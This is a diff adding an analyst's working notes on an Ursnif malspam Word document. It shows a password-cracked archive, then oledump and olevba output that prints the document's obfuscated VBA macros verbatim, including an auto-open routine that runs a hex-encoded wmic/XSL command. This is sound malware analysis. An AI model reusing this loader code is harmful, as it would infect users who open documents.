@@ -1,0 +1,1192 @@
+Reference 
+
+https://www.malware-traffic-analysis.net/2019/08/21/index.html
+
+  ---> https://www.malware-traffic-analysis.net/2019/08/21/2019-08-21-two-recent-examples-of-Urnsif-malspam.zip
+===================================================================================================================
+Use frack to crack the password protected file using fcrackzip software 
+
+# fcrackzip -u -D  -p Passwordlist/rockyou.txt Samples/MTA-sample/MRIS.zip 
+
+PASSWORD FOUND!!!!: pw == xxx
+===================================================================================================================
+
+$ unzip -P xxx MRIS.zip
+
+Archive:  MRIS.zip
+  inflating: info_08.15.doc
+===================================================================================================================  
+  $ ../../oledump/oledump.py info_08.15.doc 
+ 1:      114 '\x01CompObj'
+ 2:     4096 '\x05DocumentSummaryInformation'
+ 3:     4096 '\x05SummaryInformation'
+ 4:     7635 '1Table'
+ 5:    33392 'Data'
+ 6:      598 'Macros/PROJECT'
+ 7:      146 'Macros/PROJECTwm'
+ 8: M   2373 'Macros/VBA/ThisDocument'
+ 9:     6621 'Macros/VBA/_VBA_PROJECT'
+10:     2453 'Macros/VBA/__SRP_0'
+11:      206 'Macros/VBA/__SRP_1'
+12:      532 'Macros/VBA/__SRP_2'
+13:      156 'Macros/VBA/__SRP_3'
+14: M   7831 'Macros/VBA/a8q6cA'
+15: M   3038 'Macros/VBA/aElSGoL2t'
+16: M  13888 'Macros/VBA/aKVwYGaC'
+17: M   2905 'Macros/VBA/alJ6CoiF'
+18:     1120 'Macros/VBA/dir'
+19:       97 'Macros/aElSGoL2t/\x01CompObj'
+20:      292 'Macros/aElSGoL2t/\x03VBFrame'
+21:       90 'Macros/aElSGoL2t/f'
+22:     1780 'Macros/aElSGoL2t/o'
+23:      306 'MsoDataStore/\xc3\x80\xc3\x96PL\xc3\x93VU\xc3\x8a\xc3\x9e\xc3\x94\xc3\x9a\xc3\x99\xc3\x9cW\xc3\x82\xc3\x8e\xc3\x90\xc3\x90\xc3\x9f\xc3\x84\xc3\x9eQ==/Item'
+24:      341 'MsoDataStore/\xc3\x80\xc3\x96PL\xc3\x93VU\xc3\x8a\xc3\x9e\xc3\x94\xc3\x9a\xc3\x99\xc3\x9cW\xc3\x82\xc3\x8e\xc3\x90\xc3\x90\xc3\x9f\xc3\x84\xc3\x9eQ==/Properties'
+25:     4096 'WordDocument'
+===================================================================================================================
+Mybash$ ../../oledump/oledump.py -v -s 8 info_08.15.doc 
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Sub Document_Open()
+Dim aFCX9
+aFCX9 = Hex(54)
+' Sr hc greek
+Dim ar7lW
+ar7lW = Abs(42)
+' Fete births sparc josh afternoon
+'
+amLIoeV = ""
+ahR7Ni = IsNull(amLIoeV)
+Dim aGmCp
+For aGmCp = 61 To 64
+Debug.Print Error(aGmCp)
+Next aGmCp
+aVQjtHW = ""
+a2gvH3Rl = IsNull(aVQjtHW)
+' Helicopter shaped older invite
+Dim aK6d75U
+aK6d75U = Exp(1)
+' Nominations kennels micro schema minus
+a9su7S = ""
+aeZvEyK2 = IsNull(a9su7S)
+main
+End Sub
+===================================================================================================================
+Mybash$ ../../oledump/oledump.py -v -s 14 info_08.15.doc 
+Attribute VB_Name = "a8q6cA"
+Function ayrlTQ(aG1m35a As String) As String
+Dim aTGpk0Y
+aTGpk0Y = Hex(165)
+Dim a2680s
+For a2680s = 61 To 64
+Debug.Print Error(a2680s)
+Next a2680s
+' Removable walk
+Dim aMvW30gz
+aMvW30gz = Fix(5)
+' Lonely co-operate
+Dim aelFf
+For aelFf = 61 To 64
+Debug.Print Error(aelFf)
+Next aelFf
+' Boudoir whiff
+Dim aTt3G
+For aTt3G = 61 To 64
+Debug.Print Error(aTt3G)
+Next aTt3G
+' Dans accreditation hebe marshy
+Dim aeh89Gg0u
+aeh89Gg0u = Hex(155)
+' Warehouse ranging
+Dim alKE5g
+For alKE5g = 61 To 64
+Debug.Print Error(alKE5g)
+Next alKE5g
+' Indigenous sick truthfulness prepared prominent distribution vc
+Dim aewK8al
+aewK8al = Fix(3)
+' Mercantile knickerbockers motorcycle undergraduate surrey
+Dim aU2IJW
+For aU2IJW = 61 To 64
+Debug.Print Error(aU2IJW)
+Next aU2IJW
+' Magazine
+Dim a5mQft
+For a5mQft = 61 To 64
+Debug.Print Error(a5mQft)
+Next a5mQft
+' Editorials generated colleagues vanilla
+Dim a0K4qg
+For a0K4qg = 61 To 64
+Debug.Print Error(a0K4qg)
+Next a0K4qg
+' Shore supernal
+Dim apHrclkq
+For apHrclkq = 61 To 64
+Debug.Print Error(apHrclkq)
+Next apHrclkq
+' Inexpensive abuse telescope
+aF8Ln = ""
+aqH1aCf = IsNull(aF8Ln)
+aF02NB = ""
+ackR3 = IsNull(aF02NB)
+' Fighter informal seaboard
+Dim aOLswHDG
+aOLswHDG = Abs(2)
+Dim awyXdU5t
+awyXdU5t = Exp(10)
+' Outdoors childbirth
+Dim aLYgv
+aLYgv = Abs(-55)
+Dim aCdvOiy
+aCdvOiy = Abs(32)
+' Sign guile gpl fake qld
+End Function
+Public Sub a6gXrDp(aSNc3thyR As String, aBIuC As String)
+Dim atYdl
+atYdl = Fix(9)
+' Terrible alignment
+Dim aKLobyl
+aKLobyl = Abs(49)
+Dim ahjAvXGT
+ahjAvXGT = Abs(-32)
+' Shanghai advise
+Dim ajC1uiX
+ajC1uiX = Fix(13)
+' Whaling republic
+arc0B = ""
+aoAPiTw = IsNull(arc0B)
+Dim a1vmcn7h
+a1vmcn7h = Fix(8)
+' Suck retard gentle composite
+Dim atZhQRnw
+atZhQRnw = Fix(7)
+Dim aSjg2
+aSjg2 = Exp(3)
+' Joy gregory mem premise
+Dim ayaXILT
+ayaXILT = Fix(9)
+' Refutation controls crumble bestowal increasingly
+aoTA6SQ = ""
+aQsYV = IsNull(aoTA6SQ)
+Dim a1KBybi3
+For a1KBybi3 = 61 To 64
+Debug.Print Error(a1KBybi3)
+Next a1KBybi3
+' Optimization silesia talisman
+Dim a1eS0L
+a1eS0L = Exp(7)
+Dim anFSMCvpg
+anFSMCvpg = Exp(8)
+' Technically
+Dim ax8Bukj1c
+ax8Bukj1c = Hex(115)
+' Creator recommendation rio sheer funereal alaska
+Dim acf8YPIBz
+acf8YPIBz = Fix(15)
+' Analysts tanner freud
+Dim as4U5JxvO
+as4U5JxvO = Fix(10)
+' Allen cameroon adverted adsl sociable rebound
+Open aSNc3thyR For Output As #1
+Print #1, aBIuC
+Close #1
+'
+Dim a0Gol17L
+a0Gol17L = Exp(15)
+' Healthful script crosswise
+Dim a37DQI
+a37DQI = Hex(151)
+Dim aYlC14Lst
+aYlC14Lst = Hex(36)
+End Sub
+Public Function a2FTLQz7(ByVal HexToStr As String) As String
+Dim strTemp   As String
+Dim strReturn As String
+Dim I         As Long
+    For I = 1 To Len(HexToStr) Step 2
+        strTemp = Chr$(Val("&H" & Mid$(HexToStr, I, 2)))
+        strReturn = strReturn & strTemp
+    Next I
+    a2FTLQz7 = strReturn
+End Function
+
+===================================================================================================================
+
+Mybash$ ../../oledump/oledump.py -v -s 15 info_08.15.doc 
+Attribute VB_Name = "aElSGoL2t"
+Attribute VB_Base = "0{657D5972-E32F-4949-A505-D3437332305D}{A9C0A898-BFAB-49EF-A912-B6E8270197DC}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Private Sub UserForm_Initialize()
+Dim acTY95b23
+acTY95b23 = Fix(14)
+' Vans recondite compared finishing
+Dim aM1vciSg5
+aM1vciSg5 = Exp(14)
+aDdlzYL9 = ""
+aRN1J = IsNull(aDdlzYL9)
+' Imagination
+Dim axRQyWGfF
+axRQyWGfF = Hex(172)
+' Styles
+Dim a1XZ4WwMO
+a1XZ4WwMO = Abs(10)
+' Frederick provisional baptismal heterogeneous bind
+Dim a9A7Qux0H
+a9A7Qux0H = Abs(50)
+' Retaliation
+End Sub
+Public Sub test()
+Dim a0S94
+a0S94 = Fix(6)
+' Hughes nigeria disavow principal allow
+Dim a1ZKym
+a1ZKym = Hex(150)
+' Confirmation achieving res banana ryan floppy
+Dim aGOwqKIu
+aGOwqKIu = Hex(85)
+Dim aAdDk4rM
+aAdDk4rM = Hex(99)
+' Donald mediawiki
+End Sub
+Mybash$ ../../oledump/oledump.py -v -s 16 info_08.15.doc 
+Attribute VB_Name = "aKVwYGaC"
+Sub main()
+aBJwCPkMX = ""
+auTqHQ = IsNull(aBJwCPkMX)
+' Showers venues grand
+Dim aF1TxD
+aF1TxD = Exp(3)
+Dim aa5xDEFK
+aa5xDEFK = Hex(228)
+' Habitat exuberant pledge pyre
+Dim aqk4PAa7
+aqk4PAa7 = Hex(74)
+' Star capable sallies electoral generating
+Dim axfO6I
+axfO6I = Fix(8)
+' Lil mixing bracket speaks
+Dim aa6tSYoXv
+aa6tSYoXv = Hex(42)
+' Whichever griffith pitfall poop vicarious meme deserter
+Dim a6AyZuVYH
+a6AyZuVYH = Abs(-62)
+' Senegal inborn extract
+aTuleUIaF = ""
+aFp297zko = IsNull(aTuleUIaF)
+' Equipped
+Dim aFYcp3fwV
+aFYcp3fwV = Exp(10)
+Dim abuGC3T
+abuGC3T = Hex(158)
+' Heterogeneous responding cartilage lading roth
+Dim aylvItc
+aylvItc = Hex(4)
+auWwgEd7 = ""
+al8H6FQS = IsNull(auWwgEd7)
+' Lit trustee aberdeen foolhardy
+Dim aNkDLizhm
+aNkDLizhm = Abs(45)
+avw26Vg = ""
+atCwmqha = IsNull(avw26Vg)
+' Hardware player moreover colonist
+Dim aiZWY
+aiZWY = Hex(109)
+' Bolt analytical homily take
+Dim aw6VPSMv8
+aw6VPSMv8 = Fix(3)
+Dim ayb1zo As Object
+aRqEK583 = ""
+aHXjgu = IsNull(aRqEK583)
+' Packaging ebony canvas nascar flattened formerly
+Dim amnNr
+amnNr = Hex(244)
+' Sans flicker
+Dim ax2LK9loZ
+For ax2LK9loZ = 61 To 64
+Debug.Print Error(ax2LK9loZ)
+Next ax2LK9loZ
+' Assists loud
+aTFRz8Y = ""
+akKrbyc = IsNull(aTFRz8Y)
+' Hansom casualty
+Set ayb1zo = New aElSGoL2t
+Dim aGK4x
+aGK4x = Exp(8)
+' Punishment breton
+Dim aNt8p
+aNt8p = Abs(-57)
+' Sulky campus correction discursive maryland seraph
+Dim a3z0mg1 As String
+Dim abZcE39S
+abZcE39S = Hex(114)
+Dim awAmOa82
+For awAmOa82 = 61 To 64
+Debug.Print Error(awAmOa82)
+Next awAmOa82
+' Wal rights preoccupied plan
+a3z0mg1 = ayb1zo.a9kPX.Text
+Dim ahdLy6
+ahdLy6 = Exp(2)
+' Brand momentum
+avszE = ""
+aQ4FC = IsNull(avszE)
+' Ponds episodes beneficiary ponder insurance
+Dim aO16A9mV
+aO16A9mV = Fix(6)
+' Organized
+a3yT0 = ""
+acMCtnYd = IsNull(a3yT0)
+' Barcelona irreligious
+Dim aEFo3ORZ As String
+Dim aL04PMgz1
+aL04PMgz1 = Abs(-42)
+Dim aFRmCpVz
+aFRmCpVz = Exp(9)
+aEFo3ORZ = a2FTLQz7("633a5c57696e646f77735c53797374656d33325c7762656d5c776d69632070726f63657373206c697374202f666f726d61743a2261724a7a52734c65542e78736c22")
+ataVXLEI = ""
+aHXJ7W = IsNull(ataVXLEI)
+aqRTKt = ""
+adRvJE = IsNull(aqRTKt)
+' Inducement ochre
+Dim aN6Wq
+aN6Wq = Fix(3)
+' Gibbet priced pull
+Dim aOfXe
+aOfXe = Fix(11)
+' Experts mouthful
+Call a6gXrDp("arJzRsLeT.xsl", a3z0mg1)
+Dim aGif8BUMr
+aGif8BUMr = Fix(3)
+' Gates unalterable
+Dim adlEkrO
+adlEkrO = Fix(12)
+' Mead students slot terrier directories esperanto trials
+Dim aq8ZDNBH
+aq8ZDNBH = Hex(202)
+' Northern shirts programming
+Dim ajzZlsFBK
+ajzZlsFBK = Fix(10)
+' Dramatist ill-omened
+aTOdBynN = ""
+aHmirMu = IsNull(aTOdBynN)
+Dim awzlUn
+For awzlUn = 61 To 64
+Debug.Print Error(awzlUn)
+Next awzlUn
+' Champion fiendish converted
+Dim aiFH3gG
+aiFH3gG = Abs(-36)
+' Transferred mumbai ninety-five un
+Dim aXsYOvWr
+aXsYOvWr = Exp(8)
+Dim aDR6E1ae
+aDR6E1ae = Fix(12)
+' Priest assists retain
+Dim ao5qz
+ao5qz = Fix(7)
+' Agents strengths navy belied
+Dim aGKjCia0d
+For aGKjCia0d = 61 To 64
+Debug.Print Error(aGKjCia0d)
+Next aGKjCia0d
+' Andorra wildfire carnal
+aEDHXF = ""
+aaB0c5 = IsNull(aEDHXF)
+' Agencies practices ostend parameters
+Dim aokuval
+aokuval = Abs(14)
+Dim aLvc3bl6
+aLvc3bl6 = Exp(1)
+' Cbs
+Dim amLOhk
+amLOhk = Exp(6)
+Dim aICQw2l
+aICQw2l = Hex(193)
+' Focus shipped aryan correlative
+Dim avpn4g
+avpn4g = Hex(103)
+' Gore jazz cl ninety-nine
+Dim aCoLND
+aCoLND = Hex(233)
+' Meaningless destiny
+Dim a3byjf
+a3byjf = Fix(10)
+aEdiDs3 = ""
+ajKcPdMe0 = IsNull(aEdiDs3)
+' Establishment
+Dim aEgrxsW
+aEgrxsW = Abs(41)
+Dim aQvcG7
+aQvcG7 = Abs(52)
+' Indians mh
+aTlDZvI6 = ""
+aaN7vsqn = IsNull(aTlDZvI6)
+' Fix
+Dim aTZh1Xi
+aTZh1Xi = Fix(8)
+' Gamespot nonprofit unconnected
+Dim a16qXb
+a16qXb = Exp(11)
+Dim aTYaln
+aTYaln = Exp(8)
+' Descending ukraine arrive greatly
+Dim aqNKCSz
+aqNKCSz = Fix(16)
+' Underrated unbalanced trickery
+Dim ao5a0r
+ao5a0r = Exp(9)
+' Fragmentary objectives adolescent oily approach
+Dim a7JUTBgSC As WshShell
+Dim avRx4yOCl
+For avRx4yOCl = 61 To 64
+Debug.Print Error(avRx4yOCl)
+Next avRx4yOCl
+' Spartan forgot transparency codes
+Dim axcdFywIH
+axcdFywIH = Fix(7)
+' Inspiration knee-deep greenery amethyst suspend
+Dim agNvwybD
+agNvwybD = Exp(1)
+' Asks blent
+Dim aFMOoNyd
+aFMOoNyd = Exp(4)
+Dim amfDu
+amfDu = Fix(11)
+Dim aXTuPLS5
+aXTuPLS5 = Hex(72)
+' Immeasurable astringent
+Dim a3d7K
+a3d7K = Abs(56)
+Dim ae2jNxg
+ae2jNxg = Fix(9)
+Set a7JUTBgSC = New WshShell
+Dim aL9Ox
+aL9Ox = Exp(3)
+' Carnival clive newfoundland burner layers
+Dim acN7CB0E
+acN7CB0E = Abs(48)
+' Infuse apse tidal latticed
+Dim atY7uXym8
+atY7uXym8 = Fix(11)
+Dim aY9ZTq0J
+aY9ZTq0J = Fix(10)
+av8rwWP = ""
+aSQAt6Fl = IsNull(av8rwWP)
+Dim a3GhNR
+a3GhNR = Abs(-35)
+a7JUTBgSC.run aEFo3ORZ, 0
+Dim aInqePR
+aInqePR = Exp(4)
+' Determine tease lazarus roam
+Dim aSdmh
+aSdmh = Exp(3)
+' Jar sambo incentives nathan frames ditty unpopular
+
+Dim a4QyLn175
+a4QyLn175 = Hex(79)
+aHYrJg1b3 = ""
+aJoILFZ = IsNull(aHYrJg1b3)
+' Et
+Dim ark02
+ark02 = Hex(102)
+' Exhilaration idaho atrium japanese surfeit
+Dim aL7iCqWUh
+For aL7iCqWUh = 61 To 64
+Debug.Print Error(aL7iCqWUh)
+Next aL7iCqWUh
+' Avon gunshot postman shoemaker floyd
+Dim aUvdlAs
+aUvdlAs = Abs(56)
+End Sub
+Mybash$ ../../oledump/oledump.py -v -s 17 info_08.15.doc 
+Attribute VB_Name = "alJ6CoiF"
+Function avtkzIW(aIALcflv7 As Long) As String
+Dim aBVwx2J
+aBVwx2J = Hex(161)
+' Combatant collaboration cookies diffs mutation disquisition
+ad6sf = ""
+aYj45mwpQ = IsNull(ad6sf)
+' Im- observer wrongly
+Dim aFKyD5
+aFKyD5 = Hex(86)
+Dim amG4H
+amG4H = Fix(1)
+' Confusion reforms declare
+Dim aroTQsm5
+aroTQsm5 = Hex(81)
+' Programmers mysql consummation busted
+Dim a2QkK6O
+a2QkK6O = Abs(-35)
+' Spider dislocation tornado repair steeple
+Dim aOU3pyqL
+For aOU3pyqL = 61 To 64
+Debug.Print Error(aOU3pyqL)
+Next aOU3pyqL
+' Nourish
+Dim aLSYqmK
+aLSYqmK = Fix(7)
+' Consecrate
+anG07TU = ""
+aOu1R5w = IsNull(anG07TU)
+Dim aDGnu
+aDGnu = Hex(10)
+' Gordon guests
+Dim aZbJ3
+aZbJ3 = Exp(11)
+' Pearly ram
+Dim ao7xC
+For ao7xC = 61 To 64
+Debug.Print Error(ao7xC)
+Next ao7xC
+Dim aXJtMDn5N
+aXJtMDn5N = Fix(5)
+End Function
+
+===========================================================================================================
+olevba.py 
+
+mymac$../../oledump/oletools-0.46/oletools/olevba.py info_08.15.doc 
+olevba 0.46 - http://decalage.info/python/oletools
+Flags        Filename                                                         
+-----------  -----------------------------------------------------------------
+OLE:MASIHB-- info_08.15.doc
+===============================================================================
+FILE: info_08.15.doc
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: info_08.15.doc - OLE stream: u'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub Document_Open()
+Dim aFCX9
+aFCX9 = Hex(54)
+' Sr hc greek
+Dim ar7lW
+ar7lW = Abs(42)
+' Fete births sparc josh afternoon
+'
+amLIoeV = ""
+ahR7Ni = IsNull(amLIoeV)
+Dim aGmCp
+For aGmCp = 61 To 64
+Debug.Print Error(aGmCp)
+Next aGmCp
+aVQjtHW = ""
+a2gvH3Rl = IsNull(aVQjtHW)
+' Helicopter shaped older invite
+Dim aK6d75U
+aK6d75U = Exp(1)
+' Nominations kennels micro schema minus
+a9su7S = ""
+aeZvEyK2 = IsNull(a9su7S)
+main
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO alJ6CoiF.bas 
+in file: info_08.15.doc - OLE stream: u'Macros/VBA/alJ6CoiF'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Function avtkzIW(aIALcflv7 As Long) As String
+Dim aBVwx2J
+aBVwx2J = Hex(161)
+' Combatant collaboration cookies diffs mutation disquisition
+ad6sf = ""
+aYj45mwpQ = IsNull(ad6sf)
+' Im- observer wrongly
+Dim aFKyD5
+aFKyD5 = Hex(86)
+Dim amG4H
+amG4H = Fix(1)
+' Confusion reforms declare
+Dim aroTQsm5
+aroTQsm5 = Hex(81)
+' Programmers mysql consummation busted
+Dim a2QkK6O
+a2QkK6O = Abs(-35)
+' Spider dislocation tornado repair steeple
+Dim aOU3pyqL
+For aOU3pyqL = 61 To 64
+Debug.Print Error(aOU3pyqL)
+Next aOU3pyqL
+' Nourish
+Dim aLSYqmK
+aLSYqmK = Fix(7)
+' Consecrate
+anG07TU = ""
+aOu1R5w = IsNull(anG07TU)
+Dim aDGnu
+aDGnu = Hex(10)
+' Gordon guests
+Dim aZbJ3
+aZbJ3 = Exp(11)
+' Pearly ram
+Dim ao7xC
+For ao7xC = 61 To 64
+Debug.Print Error(ao7xC)
+Next ao7xC
+Dim aXJtMDn5N
+aXJtMDn5N = Fix(5)
+End Function
+-------------------------------------------------------------------------------
+VBA MACRO a8q6cA.bas 
+in file: info_08.15.doc - OLE stream: u'Macros/VBA/a8q6cA'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Function ayrlTQ(aG1m35a As String) As String
+Dim aTGpk0Y
+aTGpk0Y = Hex(165)
+Dim a2680s
+For a2680s = 61 To 64
+Debug.Print Error(a2680s)
+Next a2680s
+' Removable walk
+Dim aMvW30gz
+aMvW30gz = Fix(5)
+' Lonely co-operate
+Dim aelFf
+For aelFf = 61 To 64
+Debug.Print Error(aelFf)
+Next aelFf
+' Boudoir whiff
+Dim aTt3G
+For aTt3G = 61 To 64
+Debug.Print Error(aTt3G)
+Next aTt3G
+' Dans accreditation hebe marshy
+Dim aeh89Gg0u
+aeh89Gg0u = Hex(155)
+' Warehouse ranging
+Dim alKE5g
+For alKE5g = 61 To 64
+Debug.Print Error(alKE5g)
+Next alKE5g
+' Indigenous sick truthfulness prepared prominent distribution vc
+Dim aewK8al
+aewK8al = Fix(3)
+' Mercantile knickerbockers motorcycle undergraduate surrey
+Dim aU2IJW
+For aU2IJW = 61 To 64
+Debug.Print Error(aU2IJW)
+Next aU2IJW
+' Magazine
+Dim a5mQft
+For a5mQft = 61 To 64
+Debug.Print Error(a5mQft)
+Next a5mQft
+' Editorials generated colleagues vanilla
+Dim a0K4qg
+For a0K4qg = 61 To 64
+Debug.Print Error(a0K4qg)
+Next a0K4qg
+' Shore supernal
+Dim apHrclkq
+For apHrclkq = 61 To 64
+Debug.Print Error(apHrclkq)
+Next apHrclkq
+' Inexpensive abuse telescope
+aF8Ln = ""
+aqH1aCf = IsNull(aF8Ln)
+aF02NB = ""
+ackR3 = IsNull(aF02NB)
+' Fighter informal seaboard
+Dim aOLswHDG
+aOLswHDG = Abs(2)
+Dim awyXdU5t
+awyXdU5t = Exp(10)
+' Outdoors childbirth
+Dim aLYgv
+aLYgv = Abs(-55)
+Dim aCdvOiy
+aCdvOiy = Abs(32)
+' Sign guile gpl fake qld
+End Function
+Public Sub a6gXrDp(aSNc3thyR As String, aBIuC As String)
+Dim atYdl
+atYdl = Fix(9)
+' Terrible alignment
+Dim aKLobyl
+aKLobyl = Abs(49)
+Dim ahjAvXGT
+ahjAvXGT = Abs(-32)
+' Shanghai advise
+Dim ajC1uiX
+ajC1uiX = Fix(13)
+' Whaling republic
+arc0B = ""
+aoAPiTw = IsNull(arc0B)
+Dim a1vmcn7h
+a1vmcn7h = Fix(8)
+' Suck retard gentle composite
+Dim atZhQRnw
+atZhQRnw = Fix(7)
+Dim aSjg2
+aSjg2 = Exp(3)
+' Joy gregory mem premise
+Dim ayaXILT
+ayaXILT = Fix(9)
+' Refutation controls crumble bestowal increasingly
+aoTA6SQ = ""
+aQsYV = IsNull(aoTA6SQ)
+Dim a1KBybi3
+For a1KBybi3 = 61 To 64
+Debug.Print Error(a1KBybi3)
+Next a1KBybi3
+' Optimization silesia talisman
+Dim a1eS0L
+a1eS0L = Exp(7)
+Dim anFSMCvpg
+anFSMCvpg = Exp(8)
+' Technically
+Dim ax8Bukj1c
+ax8Bukj1c = Hex(115)
+' Creator recommendation rio sheer funereal alaska
+Dim acf8YPIBz
+acf8YPIBz = Fix(15)
+' Analysts tanner freud
+Dim as4U5JxvO
+as4U5JxvO = Fix(10)
+' Allen cameroon adverted adsl sociable rebound
+Open aSNc3thyR For Output As #1
+Print #1, aBIuC
+Close #1
+'
+Dim a0Gol17L
+a0Gol17L = Exp(15)
+' Healthful script crosswise
+Dim a37DQI
+a37DQI = Hex(151)
+Dim aYlC14Lst
+aYlC14Lst = Hex(36)
+End Sub
+Public Function a2FTLQz7(ByVal HexToStr As String) As String
+Dim strTemp   As String
+Dim strReturn As String
+Dim I         As Long
+    For I = 1 To Len(HexToStr) Step 2
+        strTemp = Chr$(Val("&H" & Mid$(HexToStr, I, 2)))
+        strReturn = strReturn & strTemp
+    Next I
+    a2FTLQz7 = strReturn
+End Function
+-------------------------------------------------------------------------------
+VBA MACRO aKVwYGaC.bas 
+in file: info_08.15.doc - OLE stream: u'Macros/VBA/aKVwYGaC'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub main()
+aBJwCPkMX = ""
+auTqHQ = IsNull(aBJwCPkMX)
+' Showers venues grand
+Dim aF1TxD
+aF1TxD = Exp(3)
+Dim aa5xDEFK
+aa5xDEFK = Hex(228)
+' Habitat exuberant pledge pyre
+Dim aqk4PAa7
+aqk4PAa7 = Hex(74)
+' Star capable sallies electoral generating
+Dim axfO6I
+axfO6I = Fix(8)
+' Lil mixing bracket speaks
+Dim aa6tSYoXv
+aa6tSYoXv = Hex(42)
+' Whichever griffith pitfall poop vicarious meme deserter
+Dim a6AyZuVYH
+a6AyZuVYH = Abs(-62)
+' Senegal inborn extract
+aTuleUIaF = ""
+aFp297zko = IsNull(aTuleUIaF)
+' Equipped
+Dim aFYcp3fwV
+aFYcp3fwV = Exp(10)
+Dim abuGC3T
+abuGC3T = Hex(158)
+' Heterogeneous responding cartilage lading roth
+Dim aylvItc
+aylvItc = Hex(4)
+auWwgEd7 = ""
+al8H6FQS = IsNull(auWwgEd7)
+' Lit trustee aberdeen foolhardy
+Dim aNkDLizhm
+aNkDLizhm = Abs(45)
+avw26Vg = ""
+atCwmqha = IsNull(avw26Vg)
+' Hardware player moreover colonist
+Dim aiZWY
+aiZWY = Hex(109)
+' Bolt analytical homily take
+Dim aw6VPSMv8
+aw6VPSMv8 = Fix(3)
+Dim ayb1zo As Object
+aRqEK583 = ""
+aHXjgu = IsNull(aRqEK583)
+' Packaging ebony canvas nascar flattened formerly
+Dim amnNr
+amnNr = Hex(244)
+' Sans flicker
+Dim ax2LK9loZ
+For ax2LK9loZ = 61 To 64
+Debug.Print Error(ax2LK9loZ)
+Next ax2LK9loZ
+' Assists loud
+aTFRz8Y = ""
+akKrbyc = IsNull(aTFRz8Y)
+' Hansom casualty
+Set ayb1zo = New aElSGoL2t
+Dim aGK4x
+aGK4x = Exp(8)
+' Punishment breton
+Dim aNt8p
+aNt8p = Abs(-57)
+' Sulky campus correction discursive maryland seraph
+Dim a3z0mg1 As String
+Dim abZcE39S
+abZcE39S = Hex(114)
+Dim awAmOa82
+For awAmOa82 = 61 To 64
+Debug.Print Error(awAmOa82)
+Next awAmOa82
+' Wal rights preoccupied plan
+a3z0mg1 = ayb1zo.a9kPX.Text
+Dim ahdLy6
+ahdLy6 = Exp(2)
+' Brand momentum
+avszE = ""
+aQ4FC = IsNull(avszE)
+' Ponds episodes beneficiary ponder insurance
+Dim aO16A9mV
+aO16A9mV = Fix(6)
+' Organized
+a3yT0 = ""
+acMCtnYd = IsNull(a3yT0)
+' Barcelona irreligious
+Dim aEFo3ORZ As String
+Dim aL04PMgz1
+aL04PMgz1 = Abs(-42)
+Dim aFRmCpVz
+aFRmCpVz = Exp(9)
+aEFo3ORZ = a2FTLQz7("633a5c57696e646f77735c53797374656d33325c7762656d5c776d69632070726f63657373206c697374202f666f726d61743a2261724a7a52734c65542e78736c22")
+ataVXLEI = ""
+aHXJ7W = IsNull(ataVXLEI)
+aqRTKt = ""
+adRvJE = IsNull(aqRTKt)
+' Inducement ochre
+Dim aN6Wq
+aN6Wq = Fix(3)
+' Gibbet priced pull
+Dim aOfXe
+aOfXe = Fix(11)
+' Experts mouthful
+Call a6gXrDp("arJzRsLeT.xsl", a3z0mg1)
+Dim aGif8BUMr
+aGif8BUMr = Fix(3)
+' Gates unalterable
+Dim adlEkrO
+adlEkrO = Fix(12)
+' Mead students slot terrier directories esperanto trials
+Dim aq8ZDNBH
+aq8ZDNBH = Hex(202)
+' Northern shirts programming
+Dim ajzZlsFBK
+ajzZlsFBK = Fix(10)
+' Dramatist ill-omened
+aTOdBynN = ""
+aHmirMu = IsNull(aTOdBynN)
+Dim awzlUn
+For awzlUn = 61 To 64
+Debug.Print Error(awzlUn)
+Next awzlUn
+' Champion fiendish converted
+Dim aiFH3gG
+aiFH3gG = Abs(-36)
+' Transferred mumbai ninety-five un
+Dim aXsYOvWr
+aXsYOvWr = Exp(8)
+Dim aDR6E1ae
+aDR6E1ae = Fix(12)
+' Priest assists retain
+Dim ao5qz
+ao5qz = Fix(7)
+' Agents strengths navy belied
+Dim aGKjCia0d
+For aGKjCia0d = 61 To 64
+Debug.Print Error(aGKjCia0d)
+Next aGKjCia0d
+' Andorra wildfire carnal
+aEDHXF = ""
+aaB0c5 = IsNull(aEDHXF)
+' Agencies practices ostend parameters
+Dim aokuval
+aokuval = Abs(14)
+Dim aLvc3bl6
+aLvc3bl6 = Exp(1)
+' Cbs
+Dim amLOhk
+amLOhk = Exp(6)
+Dim aICQw2l
+aICQw2l = Hex(193)
+' Focus shipped aryan correlative
+Dim avpn4g
+avpn4g = Hex(103)
+' Gore jazz cl ninety-nine
+Dim aCoLND
+aCoLND = Hex(233)
+' Meaningless destiny
+Dim a3byjf
+a3byjf = Fix(10)
+aEdiDs3 = ""
+ajKcPdMe0 = IsNull(aEdiDs3)
+' Establishment
+Dim aEgrxsW
+aEgrxsW = Abs(41)
+Dim aQvcG7
+aQvcG7 = Abs(52)
+' Indians mh
+aTlDZvI6 = ""
+aaN7vsqn = IsNull(aTlDZvI6)
+' Fix
+Dim aTZh1Xi
+aTZh1Xi = Fix(8)
+' Gamespot nonprofit unconnected
+Dim a16qXb
+a16qXb = Exp(11)
+Dim aTYaln
+aTYaln = Exp(8)
+' Descending ukraine arrive greatly
+Dim aqNKCSz
+aqNKCSz = Fix(16)
+' Underrated unbalanced trickery
+Dim ao5a0r
+ao5a0r = Exp(9)
+' Fragmentary objectives adolescent oily approach
+Dim a7JUTBgSC As WshShell
+Dim avRx4yOCl
+For avRx4yOCl = 61 To 64
+Debug.Print Error(avRx4yOCl)
+Next avRx4yOCl
+' Spartan forgot transparency codes
+Dim axcdFywIH
+axcdFywIH = Fix(7)
+' Inspiration knee-deep greenery amethyst suspend
+Dim agNvwybD
+agNvwybD = Exp(1)
+' Asks blent
